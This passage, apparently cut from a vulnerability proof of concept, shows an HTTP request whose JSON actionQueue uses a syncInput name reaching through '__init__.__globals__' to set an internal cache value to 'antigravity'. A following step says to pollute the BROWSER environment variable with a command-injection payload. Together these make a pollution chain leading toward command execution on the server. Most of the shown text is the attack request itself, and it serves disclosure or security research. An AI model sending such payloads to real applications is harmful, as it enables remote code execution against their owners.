Host: proof-of-concept:2334
Content-Length: 327
Accept: application/json

{
  "id": "E5FBWqME",
  "data": {
    "task": "",
    "tasks": []
  },
  "checksum": "XvvsDQXX",
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.location_cache._Cache__data.todo",
        "value": [
          "antigravity",
          "any"
        ]
      },
      "partials": []
    },
    {
      "type": "callMethod",
      "payload": {
        "name": "add"
      },
      "partials": []
    }
  ],
  "epoch": 1746680343776,
  "hash": "CG5pMDxc"
}
```

- Pollute `BROWSER` os environment variable where the payload for command injection is set.
```HTTP
